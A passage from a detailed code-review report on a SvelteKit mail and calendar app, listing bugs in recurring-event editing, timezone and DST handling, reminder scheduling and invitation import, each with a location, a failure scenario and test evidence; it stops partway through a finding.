- src/lib/components/AIAssistantRail.svelte:482 — the task link href comes from the webhook adapter's response with no scheme check (task-adapter.ts:213). CSP blocks javascript: execution, but it is better to allow only http(s).
- src/lib/server/ai/task-adapter.ts:54-57,160 — a floating local datetime dueDate (allowed by the regex) goes to Todoist due_datetime and Notion date.start without an offset or time_zone, so it is interpreted as UTC and the due time shifts by the user's offset.
- src/lib/server/ai/task-adapter.ts:194 — an http:// TASK_ADAPTER_URL sends TASK_ADAPTER_API_KEY in cleartext with no warning. It is operator-configured, so this is not SSRF.
- src/routes/api/ai/conversations/+server.ts:24 — POST is never called by the rail (the agent route creates sessions). It is a dead endpoint that only creates empty rows.
- src/routes/api/ai/agent/+server.ts:65-68 — the conversation row is created before the model runs, so every failed turn leaves an empty orphan row (hidden, pruned later).
- src/routes/api/ai/calendar/+server.ts:26 — the `cookies` parameter is unused.
- src/lib/server/ai/extract-event.ts:157-160 — time() does not validate minutes ('10:75' passes and rolls over in EmailDetail) and silently clamps 24:xx to 23:xx.
- src/lib/server/ai/mail-search.ts:87 — after === before (a model saying 'on 2025-03-01' with both bounds equal) is treated as backwards and becomes an unbounded search.
- src/lib/server/ai/mail-agent.ts:444-447 — if getEmailDetail fails for a stale currentEmailId (e.g. after an account switch or deletion), the whole chat turn fails with 502 instead of answering without it.
- scripts/ai-models.mjs:24 — ignores OPENAI_API_KEY. When only OpenAI is configured it reports 'the AI features are switched off', which is false.
- src/lib/components/AIAssistantRail.svelte:310-314 — 'Try again' after a timed-out but actually-applied calendar create makes a duplicate event. There is no idempotency key.

## Slice: calendar-client

Files read: 20. Skipped: none.

### calendar-client#1: Choosing "All events" when editing or dragging one occurrence moves the series start to that occurrence and drops all exceptions

- **Severity:** high · **Kind:** data-loss · **Reviewer confidence:** high
- **Location:** `src/routes/(app)/calendar/+page.svelte:164`

**Description.** submitModal (line 164) and moveEvent (line 219, via payloadFromInstance at 191-210) send the start and end of the clicked occurrence, not of the series, and still use scope 'all'. EventModal fills startDate from `editing.start` (EventModal.svelte:99-106), which is that occurrence. The server's scope-'all' path (service.ts:273-300) writes payload.start as the new DTSTART. Its "pure metadata edit, keep exceptions" branch only runs when startWall is unchanged (recurrenceShapeUnchanged, service.ts:182-189). That never holds unless the user edits the very first occurrence. The result: the series is re-anchored at the edited occurrence, every earlier occurrence disappears, EXDATEs and moved occurrences (overrides) are discarded, and a COUNT-limited series is shifted forward. The client already sends recurrenceId for scope 'all', but the server ignores it. The fix is to apply the delta (new occurrence start minus original occurrence start) to the master DTSTART, either on the server using recurrenceId or by sending the master start in EventInstance.

**Failure scenario.** Weekly Tuesday 09:00 meeting since 2026-01-20, with one EXDATE and one moved occurrence. Open the 2026-11-03 occurrence, change only the title, Save, choose "All events". The stored object becomes DTSTART 20261103T090000 with no EXDATE or override. Expanding Jan-Mar 2026 now returns [] (before the edit it returned 5 occurrences). Dragging any occurrence and picking "All events" has the same effect.

**Evidence.**

```
Checked with a scratch test that renders EventModal, then runs updateEvent with mocked caldav:
payload {"start":"2026-11-03T09:00",...,"rrule":{"freq":"WEEKLY","interval":1,"byDay":["TU"]}}
stored: DTSTART;TZID=America/New_York:20261103T090000 / RRULE:FREQ=WEEKLY;BYDAY=TU (EXDATE and RECURRENCE-ID VEVENT gone)
instances Jan-Mar 2026 after edit: []

+page.svelte:164 `apiUpdateEvent(editingInstance.id, payload, scope, editingInstance.recurrenceId)`
service.ts:273 `const next = payloadToData(payload, master.uid, {...})` (startWall = occurrence's)
```

### calendar-client#2: EventModal rebuilds the RRULE from lossy presets on every save, rewriting recurrences the user never touched

- **Severity:** high · **Kind:** data-loss · **Reviewer confidence:** high
- **Location:** `src/lib/components/calendar/EventModal.svelte:189`

**Description.** hydrateRecurrence (149-181) maps the stored rule onto a preset or the custom builder, and buildRule (189-219) always regenerates `payload.rrule` (line 303). Several common rules don't round-trip. (1) MONTHLY with BYDAY=3TU, i.e. "third Tuesday", goes to 'custom', where buildRule writes `byMonthDay = startDayOfMonth` and drops byDayOrdinal. (2) YEARLY with BYMONTH/BYDAY, e.g. Thanksgiving, matches the 'yearly' preset and becomes plain FREQ=YEARLY. (3) DAILY;BYDAY=MO..FR matches the 'daily' preset and loses BYDAY, so weekends are added. (4) FREQ=WEEKLY with no BYDAY gets BYDAY added, which changes the JSON. The server keeps the raw RRULE only when `JSON.stringify(next.rrule) === JSON.stringify(master.rrule)` (service.ts:286-292). With a different JSON, the series is rebuilt from the degraded rule and its EXDATEs and overrides are dropped (service.ts:295). The 'following' scope also creates its new series from the degraded rule. Fix: track whether the user touched any recurrence control, and if not, send `editing.rrule` unchanged.

**Failure scenario.** "Board" meets on the 3rd Tuesday monthly. The user retitles the November occurrence and saves with "All events". RRULE becomes FREQ=MONTHLY;BYMONTHDAY=17, so the December meeting lands on Dec 17 (a Thursday) instead of Dec 15.

**Evidence.**

```
Scratch test output:
instance rrule {"freq":"MONTHLY","interval":1,"byDayOrdinal":"3TU"}
payload rrule {"freq":"MONTHLY","interval":1,"byMonthDay":17}
stored: RRULE:FREQ=MONTHLY;BYMONTHDAY=17
instances after: ['2026-11-17T14:00Z','2026-12-17T14:00Z'] (was ... '2026-12-15T14:00Z')

EventModal.svelte:211 `if (customFreq === 'MONTHLY') rule.byMonthDay = startDayOfMonth;` (no byDayOrdinal path)
```

### calendar-client#3: "Remove from calendar" on a single-occurrence cancellation deletes the whole recurring series

- **Severity:** high · **Kind:** data-loss · **Reviewer confidence:** high
- **Location:** `src/lib/components/InvitationCard.svelte:127`

**Description.** removeFromCalendar always calls `apiDeleteEvent(existing.eventId, 'all', null)`. When an organizer cancels one occurrence, Google, Outlook and others send METHOD:CANCEL containing only a VEVENT with that occurrence's RECURRENCE-ID. summarizeInvitation (imip.ts:55) falls back to `parsed.overrides[0]` and findExistingCopy finds the stored series by UID, so the card shows "Event cancelled" with a "Remove from calendar" button. Clicking it calls deleteEvent with scope 'all' (service.ts:326), which deletes the whole CalDAV object. The invitation summary doesn't return the RECURRENCE-ID, so the card cannot ask for scope 'instance'. Fix: include recurrenceId in the summary (imip.ts) and delete with scope 'instance' when it is present.

**Failure scenario.** A weekly team sync is on the user's calendar. The organizer cancels next week's occurrence only. The user opens the cancellation email and clicks "Remove from calendar". Every occurrence of the series is deleted, past and future.

**Evidence.**

```
InvitationCard.svelte:127 `const res = await apiDeleteEvent(invitation.existing.eventId, 'all', null);`
imip.ts:55 `const data = parsed.master ?? parsed.overrides[0];` (no recurrenceId in InvitationSummary)
service.ts:326 `if (scope === 'all' || !recurrenceId) { await deleteObject(auth, href); ...}`
```

### calendar-client#4: Editing any event in the modal wipes attendees' PARTSTAT, CN and ROLE (an accepted invite is reset to NEEDS-ACTION)

- **Severity:** medium · **Kind:** data-loss · **Reviewer confidence:** high
- **Location:** `src/lib/components/calendar/EventModal.svelte:305`

**Description.** The modal keeps attendees as bare email strings (`attendees = editing.attendees.map((a) => a.email)`, line 111) and sends `attendees.map((email) => ({ email }))` (line 305). The server uses `payload.attendees` as-is (ics.ts:805), so every save rewrites each ATTENDEE with PARTSTAT=NEEDS-ACTION;RSVP=TRUE and no CN. This happens on any edit, including a typo fix or a reminder change. The user's own ACCEPTED status on an imported invitation is lost, so InvitationCard (which reads the stored copy's PARTSTAT) no longer shows the RSVP, and guests' recorded replies on events the user organized are lost too. Drag-move preserves the data because payloadFromInstance passes `ev.attendees`. Fix: keep the full EventAttendee objects and merge by email.

**Failure scenario.** The user accepts an invitation (stored with ATTENDEE;CN=Me;PARTSTAT=ACCEPTED), then edits it to add a reminder. The stored copy now has ATTENDEE;ROLE=REQ-PARTICIPANT;PARTSTAT=NEEDS-ACTION;RSVP=TRUE:mailto:me@..., and the invitation card no longer highlights "Yes".

**Evidence.**

```
Scratch test: instance attendees [{"email":"me@example.com","name":"Me","partStat":"ACCEPTED",...}] -> payload "attendees":[{"email":"me@example.com"}] -> stored `ATTENDEE;ROLE=REQ-PARTICIPANT;PARTSTAT=NEEDS-ACTION;RSVP=TRUE:mailto:me@example.com`
```

### calendar-client#5: Time grid positions events by elapsed ms since midnight: on DST days events are drawn an hour off, and on the fall-back day events from 23:00 to 24:00 disappear

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/calendar/layout.ts:110`

**Description.** clipToDay computes `dayEnd = dayStart + DAY_MS` and `startMin = (s - dayStart)/60000`, which is elapsed real time, not wall-clock minutes. On a 25-hour fall-back day, events after the 02:00 transition are drawn one hour late, and any event starting from 23:00 local satisfies `s >= dayEnd` and returns null. timedEventsByDay has already assigned it to that day, so it appears in neither the grid nor the all-day lane. On the 23-hour spring-forward day, events after the transition are drawn one hour early. Hour labels, click-to-create, the drag ghost (minutesToDate) and the now-line all use wall-clock time, so they don't line up with the events. Today, 2026-11-01, is the US fall-back day. Fix: derive startMin/endMin from local getHours()*60+getMinutes(), clamping against the next local midnight (addDays) instead of +86400000.

**Failure scenario.** TZ=America/New_York on 2026-11-01: a 10:00 event is drawn in the 11:00 row (startMin 660), and a 23:30 event isn't drawn in Day or Week view at all.

**Evidence.**

```
Scratch test with TZ=America/New_York:
local start e1 Sun Nov 01 2026 10:00:00 GMT-0500 -> clip e1 { startMin: 660, endMin: 720 }
local start e2 Sun Nov 01 2026 23:30:00 GMT-0500 -> bucket '2026-11-01' contains it, clip e2 null
```

### calendar-client#6: Zero-length timed events (no DTEND/DURATION, or DTEND = DTSTART) never appear in Day, 3-day or Week views

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/calendar/layout.ts:116`

**Description.** Per RFC 5545, a DATE-TIME DTSTART with no DTEND/DURATION means a zero-length event, and the server keeps that as durationMs = 0 (ics.ts:170-200). timedEventsByDay assigns such an event to its day, but clipToDay returns null because `endMin - startMin <= 0` is checked before the 15-minute minimum is applied on the next line. These events (deadlines, reminders, many imported or iMIP items) therefore show in Month view but silently vanish from every time-grid view. Fix: apply the minimum height before the emptiness check, e.g. treat s === e as a 15-minute block.

**Failure scenario.** An imported "Submit report" event with DTSTART:20261103T150000Z and no DTEND shows in Month view on Nov 3, but the Week and Day views for Nov 3 are empty.

**Evidence.**

```
layout.ts:116-117 `if (endMin - startMin <= 0) return null;
	return { startMin, endMin: Math.max(endMin, startMin + 15) };`
Scratch test: bucket zero ['2026-11-03'], clip zero null
```

### calendar-client#7: A plain click on an event's resize handle saves the event: short events grow to 15 minutes, and recurring events open the scope dialog

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/components/calendar/TimeGrid.svelte:168`

**Description.** resizePointerDown (121-125) starts a 'resize' drag with no movement threshold or `moved` flag, and windowPointerUp always calls onEventMove for that kind (168-172). The handle is the bottom 6 px of every block, so a simple click there sends a PATCH. curEndMin comes from the block's display endMin, which clipToDay raises to at least start+15. Sub-15-minute (and zero-length) events are therefore lengthened, and on DST days the end is shifted. Every such accidental save also rewrites the event's TZID to the browser zone and bumps SEQUENCE. On a recurring event it opens the scope dialog, where "All events" triggers the re-anchoring problem described above. The move path already has a DRAG_THRESHOLD_PX check; resize needs one too.

**Failure scenario.** The user clicks near the bottom edge of a 10:00-10:05 event to open it. Instead of the popover, the event is saved as 10:00-10:15.

**Evidence.**

```
Scratch test: pointerdown on .cursor-ns-resize, then pointerup on window -> onEventMove called with ['Tue Nov 03 2026 10:00:00', 'Tue Nov 03 2026 10:15:00'] for a 10:00-10:05 event.
```

### calendar-client#8: No pointercancel handling: on touch screens, scrolling the grid leaves a stale drag that the next tap anywhere carries out (a create dialog, or an event move)

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** medium
- **Location:** `src/lib/components/calendar/TimeGrid.svelte:208`

**Description.** Drags start on the grid or an event block (gridPointerDown/blockPointerDown) and finish in a window-level pointerup. Nothing handles pointercancel, and nothing sets touch-action or calls setPointerCapture. When a touch on the grid turns into a scroll, the browser fires pointercancel and never sends pointerup, so `drag` stays set and the "New event" ghost stays on screen. The next pointerup anywhere in the window, such as tapping Today, Next or the drawer, runs the stale drag. For a 'create' drag it opens the New event modal. For a 'move' drag that crossed 5 px before the scroll began, it calls onEventMove and PATCHes the event to the ghost's snapped time, or opens the scope dialog. Other components in the repo handle this (ImageViewer.svelte:63, ProfileCard.svelte:248, (app)/+layout.svelte:513 all bind onpointercancel). Fix: add `onpointercancel={() => (drag = null)}` on the window, and consider pointer capture.

**Failure scenario.** On a phone in Day view, the user swipes up to scroll to the afternoon (starting on an empty slot), then taps the toolbar's "Next" button. The New event dialog opens for the slot where the swipe started. If the swipe started on an event, that event can be rescheduled.

**Evidence.**

```
TimeGrid.svelte:208 `<svelte:window onpointermove={windowPointerMove} onpointerup={windowPointerUp} />` (no pointercancel); windowPointerUp 152-173 acts on whatever `drag` holds; dragGhost for 'create' renders as soon as pointerdown sets drag (181).
```

### calendar-client#9: Opening /calendar without ?date= uses the UTC date, so users far from UTC get the wrong day, week or month

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/routes/(app)/calendar/+page.server.ts:33`

**Description.** With no date param, the load uses `new Date().toISOString().slice(0, 10)`, the UTC calendar date (the comment says "server-local"). It justifies this by saying "the client URL always carries an explicit date after the first navigation", but nothing on the client corrects the first load. The app rail (AppRail.svelte:36), the calendar notifications (calendarNotify.ts:114,119,149,156) and the corner + menu all go to bare `/calendar`. +page.svelte trusts data.date for selectedDate, while the today highlight and the Today button use the local date, so the page opens on a day that isn't today. Fix: pass the date from the client (e.g. a cookie or a client-side redirect adding ?date=localToday when it's missing), or compute it in a +page.ts.

**Failure scenario.** A user in Los Angeles clicks Calendar at 18:00 on Saturday Oct 31 with Day view saved. The page shows Sunday Nov 1. In Month view on the last evening of a month it opens the next month. In Asia/Tokyo before 09:00 it opens yesterday.

**Evidence.**

```
+page.server.ts:30-33 `// Server-local today; the client URL always carries an explicit date after the first navigation ... date = new Date().toISOString().slice(0, 10);`
AppRail.svelte:36 `href: '/calendar'`; no +page.ts or redirect in src/routes/(app)/calendar/
```

### calendar-client#10: All-day reminders fire relative to UTC midnight instead of local midnight

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/stores/calendarNotify.ts:131`

**Description.** upcomingReminders computes all-day start as `new Date(`${ev.start}T00:00:00`)` on the server, which is UTC in the node:24-alpine image. Its contract says "all-day occurrences use local-midnight semantics client-side" (service.ts:473). scheduleReminders doesn't do that: it uses `item.fireAt` directly. In-app all-day reminders are therefore off by the user's UTC offset. In negative-offset zones they fire the previous afternoon or evening. The server's ±horizon filter uses the same UTC fireAt, so a correct fix needs the client to recompute fireAt for all-day items from the local midnight of item.start, and the server to widen the all-day window by ±14 h.

**Failure scenario.** A user in America/Los_Angeles sets an all-day event on Nov 5 with "At time of event". The reminder toast and notification appear at 16:00 PST on Nov 4.

**Evidence.**

```
calendarNotify.ts:131 `const delay = Math.max(0, item.fireAt - now);`
service.ts:492 `const startMs = ev.allDay ? new Date(`${ev.start}T00:00:00`).getTime() : ...`
service.ts:473 `/** Occurrence start, UTC ISO (all-day occurrences use local-midnight semantics client-side). */`
```

### calendar-client#11: Reminder de-duplication ignores the event's start time, so a rescheduled event gets no reminder (and stale timers fire for the old time)

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/stores/calendarNotify.ts:130`

**Description.** Fired reminders are remembered by `item.key` = `${uid}:${recurrenceId}:${minutes}` (service.ts:497) for FIRED_TTL_MS = 2 days (lines 95 and 130). For a non-recurring event the key doesn't change when the event moves. Once a reminder has fired, the reminder for the new time is skipped for up to two days. A local edit also doesn't re-poll or clear scheduled timers, so a reminder scheduled for the old time still fires (up to 5 minutes until the next poll), and that marks the key as fired and suppresses the real one. The server push worker uses the same key. Fix: include fireAt (or the start) in the dedupe key, and re-run scheduleReminders after local mutations.

**Failure scenario.** A 10:00 meeting's 10-minute reminder fires at 09:50. At 09:55 the meeting is pushed to 14:00 (on this device or elsewhere). No reminder appears at 13:50 because `fired['uid::10']` is already set.

**Evidence.**

```
calendarNotify.ts:95 `if (fired[item.key]) return;` / :130 `if (fired[item.key]) continue;`
service.ts:497 `key: `${ev.uid}:${ev.recurrenceId ?? ''}:${minutes}``
```

### calendar-client#12: The user's own changes trigger 'calendar updates' notifications: imports are never marked as touched, and the touch TTL equals the poll interval

- **Severity:** low · **Kind:** ux · **Reviewer confidence:** medium
- **Location:** `src/lib/calendar/api.ts:103`

**Description.** notifyChanged suppresses only ids that wasTouchedRecently. apiImportEvents never calls markTouched, and the import API returns no ids. After importing an .ics file, the next poll reports up to 20 'changed' objects per calendar (POLL_CHANGE_CAP), giving a "20 calendar updates" toast and 5 desktop notifications for events the user just imported. Separately, TOUCH_TTL_MS (line 10) equals POLL_INTERVAL_MS (5 min), and the check runs after the poll's network round-trip (several CalDAV requests). An edit made in the seconds after a poll, or in a throttled background tab, has expired by the next poll and is announced as a change from another device. Fix: return the written ids from /api/calendar/import and mark them, and give TTL some headroom, e.g. 2× the poll interval.

**Failure scenario.** The user imports a 300-event holiday calendar. About 5 minutes later, 5 'Calendar: <holiday> — New or updated event' desktop notifications and a '20 calendar updates' toast appear.

**Evidence.**

```
api.ts:10 `const TOUCH_TTL_MS = 5 * 60 * 1000;` vs calendarNotify.ts:24 `const POLL_INTERVAL_MS = 5 * 60_000;`
api.ts:103-117 apiImportEvents has no markTouched; ImportBatchResult carries no ids.
```

### calendar-client#13: Only the tab that polls schedules reminder timers, so closing or reloading it misses or delays reminders

- **Severity:** low · **Kind:** bug · **Reviewer confidence:** medium
- **Location:** `src/lib/stores/calendarNotify.ts:172`

**Description.** The cross-tab gate lets only the tab whose interval fires first poll. Only that tab calls scheduleReminders, and the other tabs hold no timers. If the polling tab is closed, the next poll comes from another tab only once LAST_POLL_KEY is more than 4.5 min old, which can be up to ~9.5 min after the last poll. The server returns only reminders with fireAt ≥ now−5 min (service.ts:495), so reminders due in that gap are never shown. Reloading a single tab skips the immediate poll (the gate still sees the recent timestamp), so reminders due in the next 5 minutes fire up to 5 minutes late. Fix: have the polling tab write the reminder list to localStorage and schedule timers from it in every tab, using the existing FIRED_KEY dedupe, including at start().

**Failure scenario.** Tabs A and B are open. A polls at 10:00 and schedules a 10:02 'starts now' reminder. The user closes A at 10:01. B's tick at 10:04 is gated, and its 10:09 poll asks the server for fireAt ≥ 10:04. The 10:02 reminder never appears.

**Evidence.**

```
calendarNotify.ts:171-173 `const lastPoll = readJson<number>(LAST_POLL_KEY, 0); if (Date.now() - lastPoll < POLL_INTERVAL_MS * 0.9) return; writeJson(LAST_POLL_KEY, Date.now());`
service.ts:495 `if (fireAt < now - 5 * 60000 || fireAt > now + horizonMs) continue;`
```

### calendar-client: minor notes

- calendarNotify.ts:190 / 211-216: stop() doesn't cancel an in-flight poll(). When it resolves, scheduleReminders/notifyChanged still run, so timers leak past stop(): after turning notifications off or on layout teardown, a reminder can still fire. Guard with a generation counter or a `stopped` flag.
- MonthView.svelte:48, TimeGrid.svelte:36, MiniMonth.svelte:39: `const today = new Date()` is captured once, so the today highlight goes stale after midnight in a long-lived tab (TimeGrid's todayIdx uses nowMs, but the header highlight doesn't).
- EventPopover.svelte:53: the Escape onkeydown sits on a non-focusable overlay that never receives focus, so Escape doesn't close the popover, and the page keydown handler has no Escape case.
- EventModal.svelte:283/298 and +page.svelte:202: every save or drag sends timeZone=localTimeZone(), rewriting the TZID of events authored in another zone. This changes DST alignment for recurring invitations from other countries and makes recurrenceShapeUnchanged false, which drops exceptions even when the first occurrence is edited.
- EventModal.svelte:124: new events default to a 10-minutes-before alarm even when 'All day' is ticked, so an all-day event's reminder fires at 23:50 the previous evening.
- import.ts:173: a single UID group larger than maxBatchBytes (a series with many overrides, or a big ATTACH) is still sent as one batch over the 1 MB body limit and fails as a whole with HTTP 413.
- import.ts:68-75: parseStart ignores TZID and reads the wall time in the browser zone, so preview dates for events in other zones can be off by a day near midnight (preview only).
- CalendarModal.svelte:59,63: when res.error is undefined, `new Error(undefined).message` is '', so a failed save shows no error text.
- CalendarPanel.svelte:89-92: the visibility checkbox is one-way bound, so if apiUpdateCalendar fails the box stays toggled while the calendar isn't.
- calendarNotify.ts:133: the `POLL_INTERVAL_MS * 25` (125 min) scheduling horizon looks left over from a shorter poll interval; the server horizon is 30 min.
- layout.ts:44-48: timed events crossing midnight (e.g. 22:00-01:00 or overnight flights) render as all-day bars in Week/Day views rather than as blocks split across columns, so clipToDay's clipping branch is effectively unused.
- InvitationCard.svelte:209-224: the 'Going? Yes/Maybe/No' buttons only store PARTSTAT locally; no iTIP REPLY reaches the organizer, though the UI reads like an RSVP.
- Outside this slice: imip.ts:172 importInvitation does an unconditional PUT. An iMIP REQUEST that updates a single occurrence (override-only VEVENT) replaces the whole stored series when the user RSVPs from InvitationCard.
- Outside this slice: ics.ts:589-597 compares the raw o.recurrenceId with the normalized keys in emittedOverrideKeys, so an all-day master with a date-time RECURRENCE-ID override emits that occurrence twice.
- +page.server.ts:30: the comment says 'Server-local today' but the code uses the UTC date via toISOString().

## Slice: calendar-server

Files read: 19. Skipped: none.

### calendar-server#1: Accepting an update to one occurrence replaces the whole recurring series, and cancelling one occurrence deletes the whole series

- **Severity:** high · **Kind:** data-loss · **Reviewer confidence:** high
- **Location:** `src/lib/server/calendar/imip.ts:172`

**Description.** Organizers (Google, Outlook) send changes to a single occurrence as an iMIP REQUEST or CANCEL whose only VEVENT carries a RECURRENCE-ID. In that case summarizeInvitation (imip.ts:55) falls back to `parsed.overrides[0]` and drops the recurrence id, so the summary does not say this is about one occurrence. When the user clicks Yes/Maybe/No, importInvitation does an unconditional PUT of that override-only ICS to `{calendar}/{uid}.ics` (imip.ts:169-172), which is the same href as the stored series, so the master and all its exceptions are overwritten. For a CANCEL of one occurrence, the card says 'Event cancelled'. Its 'Remove from calendar' button (InvitationCard.svelte:127) calls apiDeleteEvent(eventId, 'all', null) because the summary has no recurrenceId, so the whole series is deleted. The same overwrite happens with .ics import (import.ts:141) when a file holds only an override for a UID that already exists.

**Failure scenario.** The user has accepted the weekly series 'Weekly sync' (UID m1). The organizer moves the Nov 16 occurrence, and the user clicks 'Yes' on that email. The stored object now holds one VEVENT with a RECURRENCE-ID: 9 occurrences in Nov-Dec become 1. Verified with a mocked CalDAV test: before = 9 instances, after = 1 ('Weekly sync (moved)'). For a per-occurrence CANCEL, the summary has no recurrenceId and the client deletes with scope 'all'.

**Evidence.**

```
imip.ts:55 `const data = parsed.master ?? parsed.overrides[0];` (recurrenceId never exposed)
imip.ts:169-172 `const href = `${calendarHref(...)}${encodeURIComponent(summary.uid)}.ics`; await putObject(auth, href, patched, undefined);`
InvitationCard.svelte:127 `apiDeleteEvent(invitation.existing.eventId, 'all', null)`
```

### calendar-server#2: Editing a recurring series with scope 'all' from a later occurrence moves DTSTART there, erasing earlier occurrences and every exception

- **Severity:** high · **Kind:** data-loss · **Reviewer confidence:** high
- **Location:** `src/lib/server/calendar/service.ts:273`

**Description.** For scope 'all', the client sends the start and end of the occurrence that was clicked or dragged, with timeZone set to the browser's zone (+page.svelte:196-209, EventModal.svelte:292-299), and also sends recurrenceId. updateEvent ignores recurrenceId in the 'all' path. It builds `next` straight from the payload, so the master's DTSTART becomes the clicked occurrence. It does not apply the change as a delta to the master's DTSTART. Because startWall now differs, recurrenceShapeUnchanged (182-189) returns false, so EXDATEs, RDATEs and every override are dropped (294-300). The same happens with no date change at all when the event's TZID differs from the browser's zone: tzid is compared, and the series is also moved into the browser's zone, which changes its DST behaviour. With COUNT, the count restarts from the clicked occurrence, so the series runs longer.

**Failure scenario.** A weekly Monday standup starts Nov 2 and has an EXDATE on Nov 9. The user opens the Nov 30 occurrence, renames it and picks 'All events'. Verified result: DTSTART;TZID=Asia/Riyadh:20261130T090000, the EXDATE is gone, and the Nov 2/16/23 occurrences no longer exist. A drag-move with 'All events' does the same. A title-only edit of a New York-zoned invitation made from a Riyadh browser also drops all of its exceptions.

**Evidence.**

```
service.ts:273 `const next = payloadToData(payload, master.uid, {...})` (recurrenceId unused for scope 'all')
service.ts:186-187 `JSON.stringify(a.startWall) === JSON.stringify(b.startWall) && a.tzid === b.tzid`
service.ts:295-300 overrides kept only if shape unchanged
+page.svelte:200-202 `start: toLocalWallClock(start) ... timeZone: localTimeZone()`
```

### calendar-server#3: Timed-event UNTIL is always written as <date>T235959Z, so 'this and following' and 'ends on' are off by one day outside UTC

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/calendar/service.ts:176`

**Description.** truncateRRuleRaw (service.ts:174-179) and buildRRuleString (ics.ts:656-661) write the end of a timed series as `${date}T235959Z`, which is the end of the day in UTC, not in the event's zone. expandToInstances (correctly) reads a Z UNTIL as a UTC instant (ics.ts:510-511), and so do other clients. For zones east of UTC, an occurrence in the local morning of the split day falls before UNTIL and is kept. For zones west of UTC, an evening occurrence on the day before the split falls after UNTIL and is lost. The same error affects the UI's 'Ends on <date>' option.

**Failure scenario.** Verified: a daily 08:00 Asia/Tokyo event, with 'Delete this and following' from Nov 10. RRULE becomes UNTIL=20261109T235959Z, and the Nov 10 08:00 JST occurrence (= Nov 9 23:00Z) is still shown: 9 instances where 8 are expected. A daily 19:00 America/Los_Angeles event deleted from Nov 10 also loses Nov 9: 7 instances where 8 are expected. 'Edit this and following' gives a duplicate (Tokyo) or a gap (Los Angeles) at the split.

**Evidence.**

```
service.ts:176 `const until = allDay ? d : `${d}T235959Z`;`
ics.ts:660 `parts.push(`UNTIL=${allDay ? d : `${d}T235959Z`}`);`
```

### calendar-server#4: Reminders set more than about 24h before the event never fire, and all-day reminders use the server's midnight

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/calendar/service.ts:488`

**Description.** upcomingReminders only fetches and expands events that start in [now-1d, now+horizon+1d]. A reminder due inside the 30-minute horizon whose lead time is over about 24.5h belongs to an event that starts later than that window, so it is never returned. EventModal offers '2 days before' and '1 week before' (EventModal.svelte:59-60), and both the poll route and the push worker (push/worker.ts:415) use this function. Separately, all-day starts are turned into an instant with `new Date(`${ev.start}T00:00:00`)` (line 492), which is midnight in the server's zone (UTC in Docker), not the user's. Both clients schedule on that `fireAt` as-is.

**Failure scenario.** Verified: an event starting in 2 days plus 10 minutes, with a 2880-minute VALARM, is queried over -24h to +24.5h and returns 0 reminders, so the '2 days before' reminder is silently never delivered. Separately, an all-day event with an 'at start' reminder fires at 16:00 the day before for a Los Angeles user and at 03:00 for a Riyadh user.

**Evidence.**

```
service.ts:488 `getEventsInRange(auth, userEmail, now - 86400000, now + horizonMs + 86400000)`
service.ts:492 `ev.allDay ? new Date(`${ev.start}T00:00:00`).getTime()`
EventModal.svelte:59-60 `{ value: 2880, ...}, { value: 10080, label: '1 week before' }`
```

### calendar-server#5: Invitation import checks neither ORGANIZER nor SEQUENCE, so an older or spoofed REQUEST overwrites the stored event (including meetings the user organizes)

- **Severity:** medium · **Kind:** security · **Reviewer confidence:** high
- **Location:** `src/lib/server/calendar/imip.ts:169`

**Description.** Invitations are matched to stored events by UID alone (findExistingCopy line 137, importInvitation line 169), and the stored copy is overwritten unconditionally. There is no check that the incoming ORGANIZER matches the stored copy's ORGANIZER or the email's sender, and no check that its SEQUENCE/DTSTAMP is newer. The card shows 'On your calendar' and the RSVP buttons for any matching UID, and the organizer name it shows comes from the attacker-controlled CN. A CANCEL from anyone who knows the UID shows 'Event cancelled' with a 'Remove from calendar' button.

**Failure scenario.** (1) The user scrolls back to the original invitation email for a meeting that has since been rescheduled (SEQUENCE 3 stored) and clicks 'Yes'. The SEQUENCE 0 copy overwrites the stored one, and the calendar shows the old time. (2) The user organizes a meeting and invites an outsider, who now knows the UID. The outsider sends a METHOD:REQUEST with the same UID, ORGANIZER set to themselves and a new time and location. The card shows 'On your calendar' plus RSVP buttons, and one click replaces the user's own meeting.

**Evidence.**

```
imip.ts:170-172 `// Unconditional PUT: updated invitations (SEQUENCE bumps) and RSVP changes overwrite the previous copy by design.
await putObject(auth, href, patched, undefined);`
```

### calendar-server#6: Unknown or unmapped TZIDs (and floating times) are silently treated as UTC even when the file has a VTIMEZONE, and edits save that wrong time permanently

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/calendar/ics.ts:111`

**Description.** propZone keeps a zone only when Intl knows it or it is in the partial WINDOWS_TZ map (tz.ts:57-118). Any other zone becomes 'UTC', and the VTIMEZONE definitions in the same file are never consulted, although ical.js could use them. Outlook often uses TZID 'Customized Time Zone'. Many Windows ids are missing from the map, including 'Syria Standard Time', 'West Bank Standard Time', 'E. Africa Standard Time', 'Libya Standard Time', 'Azerbaijan/Georgian', 'Newfoundland', 'Canada Central' and 'Central Standard Time (Mexico)'. Floating times are also treated as UTC (lines 113-115). On any later edit, dtLine writes `DTSTART:...Z` (ics.ts:645). The wrong instant is then stored on the server, and the user's other clients show it too.

**Failure scenario.** Verified: an invitation with a VTIMEZONE 'Customized Time Zone' (+03:00) and DTSTART 09:00 shows at 09:00Z (12:00 local, 3 hours late). After any edit or occurrence delete it is rewritten as 'DTSTART:20260105T090000Z'. Every Windows id listed above also resolved to 'UTC' in the test.

**Evidence.**

```
ics.ts:111 `return normalizeTzid(tzid) ?? 'UTC';`
ics.ts:113-115 `// Z-suffixed → utc zone; floating → treat as UTC.`
ics.ts:645 `if (data.tzid === 'UTC') return `${name}:${wallClockToIcs(wc)}Z`;`
```

### calendar-server#7: EXDATE, RDATE and RECURRENCE-ID values ignore their own TZID or Z, so exceptions in another zone don't match and are rewritten wrongly

- **Severity:** medium · **Kind:** bug · **Reviewer confidence:** high
- **Location:** `src/lib/server/calendar/ics.ts:223`

